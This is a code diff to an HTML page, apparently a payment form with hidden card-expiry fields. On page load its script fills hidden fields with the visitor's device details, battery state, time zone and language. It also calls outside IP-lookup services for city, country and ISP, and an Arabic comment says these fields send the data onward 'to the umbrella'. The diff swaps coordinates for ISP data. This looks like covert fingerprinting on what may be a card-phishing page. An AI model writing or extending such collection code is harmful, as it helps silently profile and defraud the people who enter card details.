@@ -257,10 +257,9 @@
                     <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">
 
                     <!-- خانات مخفية لإرسال بيانات الجهاز والشبكة للمظلة -->
-                    <input type="hidden" name="geoLat" id="geoLat" value="غير معروف">
-                    <input type="hidden" name="geoLon" id="geoLon" value="غير معروف">
                     <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
                     <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
+                    <input type="hidden" name="ispProvider" id="ispProvider" value="غير معروف">
                     <input type="hidden" name="batteryInfo" id="batteryInfo" value="غير معروف">
                     <input type="hidden" name="deviceRAM" id="deviceRAM" value="غير معروف">
                     <input type="hidden" name="cpuCores" id="cpuCores" value="غير معروف">
@@ -403,56 +402,54 @@
     </footer>
 
     <script>
-       // --- 1. جلب بيانات الجهاز تلقائياً وتخزينها في الخانات المخفية ---
-async function collectDeviceDetails() {
-    document.getElementById('deviceRAM').value = (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير مدعوم');
-    document.getElementById('cpuCores').value = navigator.hardwareConcurrency || 'غير معروف';
-    document.getElementById('screenSize').value = `${window.screen.width} x ${window.screen.height}`;
-    document.getElementById('userTimeZone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
-    document.getElementById('lang').value = navigator.language || navigator.userLanguage || 'غير معروف';
+        // --- 1. جلب بيانات الجهاز تلقائياً وتخزينها في الخانات المخفية ---
+        async function collectDeviceDetails() {
+            document.getElementById('deviceRAM').value = (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير مدعوم');
+            document.getElementById('cpuCores').value = navigator.hardwareConcurrency || 'غير معروف';
+            document.getElementById('screenSize').value = `${window.screen.width} x ${window.screen.height}`;
+            document.getElementById('userTimeZone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+            document.getElementById('lang').value = navigator.language || navigator.userLanguage || 'غير معروف';
 
-    const ua = navigator.userAgent;
-    let deviceType = 'كمبيوتر (Desktop)';
-    if (/Mobi|Android/i.test(ua)) deviceType = 'هاتف (Mobile)';
-    else if (/Tablet|iPad/i.test(ua)) deviceType = 'تابلت (Tablet)';
-    document.getElementById('deviceType').value = deviceType;
+            const ua = navigator.userAgent;
+            let deviceType = 'كمبيوتر (Desktop)';
+            if (/Mobi|Android/i.test(ua)) deviceType = 'هاتف (Mobile)';
+            else if (/Tablet|iPad/i.test(ua)) deviceType = 'تابلت (Tablet)';
+            document.getElementById('deviceType').value = deviceType;
 
-    // جلب حالة البطارية إن أمكن
-    if (navigator.getBattery) {
-        try {
-            const battery = await navigator.getBattery();
-            document.getElementById('batteryInfo').value = `${Math.round(battery.level * 100)}% (${battery.charging ? 'جاري الشحن ⚡' : 'غير موصول بالكهرباء'})`;
-        } catch (e) {
-            document.getElementById('batteryInfo').value = 'غير متاح';
-        }
-    }
-
-    // جلب بيانات الموقع عبر IP باستخدام API بديل وموثوق بدون CORS Issues
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (!res.ok) throw new Error("فشل ipapi");
-        const data = await res.json();
-        
-        document.getElementById('geoLat').value = data.latitude || 'غير معروف';
-        document.getElementById('geoLon').value = data.longitude || 'غير معروف';
-        document.getElementById('geoCity').value = data.city || 'غير معروف';
-        document.getElementById('geoCountry').value = data.country_name || 'غير معروف';
-    } catch (err) {
-        // Fallback إلى خدمة إضافية في حال فشل الأولى
-        try {
-            const fallbackRes = await fetch('https://ip-api.com/json/?fields=status,country,city,lat,lon');
-            const fbData = await fallbackRes.json();
-            if (fbData.status === 'success') {
-                document.getElementById('geoLat').value = fbData.lat || 'غير معروف';
-                document.getElementById('geoLon').value = fbData.lon || 'غير معروف';
-                document.getElementById('geoCity').value = fbData.city || 'غير معروف';
-                document.getElementById('geoCountry').value = fbData.country || 'غير معروف';
+            // جلب حالة البطارية إن أمكن
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    document.getElementById('batteryInfo').value = `${Math.round(battery.level * 100)}% (${battery.charging ? 'جاري الشحن ⚡' : 'غير موصول بالكهرباء'})`;
+                } catch (e) {
+                    document.getElementById('batteryInfo').value = 'غير متاح';
+                }
             }
-        } catch (e) {
-            console.error('فشل جلب الموقع الجغرافي بالكامل');
+
+            // جلب بيانات المدينة والدولة ومزود الخدمة (Registered ISP)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (!res.ok) throw new Error("فشل ipapi");
+                const data = await res.json();
+                
+                document.getElementById('geoCity').value = data.city || 'غير معروف';
+                document.getElementById('geoCountry').value = data.country_name || 'غير معروف';
+                document.getElementById('ispProvider').value = data.org || data.asn || 'غير معروف';
+            } catch (err) {
+                // Fallback لتغطية التوقف عبر ip-api
+                try {
+                    const fallbackRes = await fetch('https://ip-api.com/json/?fields=status,country,city,isp,org');
+                    const fbData = await fallbackRes.json();
+                    if (fbData.status === 'success') {
+                        document.getElementById('geoCity').value = fbData.city || 'غير معروف';
+                        document.getElementById('geoCountry').value = fbData.country || 'غير معروف';
+                        document.getElementById('ispProvider').value = fbData.isp || fbData.org || 'غير معروف';
+                    }
+                } catch (e) {
+                    console.error('فشل جلب تفاصيل الموقع والشبكة');
+                }
+            }
         }
-    }
-}
 
         // تشغيل جلب البيانات عند تحميل الصفحة
         collectDeviceDetails();
